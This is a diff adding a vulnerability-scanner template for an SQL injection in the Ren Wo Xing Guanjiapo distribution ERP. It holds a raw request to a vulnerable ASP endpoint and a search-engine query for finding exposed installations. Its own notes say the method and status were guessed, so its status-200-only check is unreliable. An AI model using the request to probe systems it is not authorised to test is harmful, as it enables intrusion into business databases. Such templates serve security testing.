@@ -1,0 +1,23 @@
+id: poc-08c11b7b5cee3e2e2141
+info:
+  name: 任我行管家婆分销ERP系统存在sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/08c11b7b5cee3e2e2141fb56ae348e2c
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 08c11b7b5cee3e2e2141fb56ae348e2c
+    fofa: + hunter`app.name="任我行管家婆分销 ERP"`
+http:
+- raw:
+  - 'GET /common/viewaccountBase.asp?TimeCheckPoint=80616.91&billnumberid=-1&billtype= HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
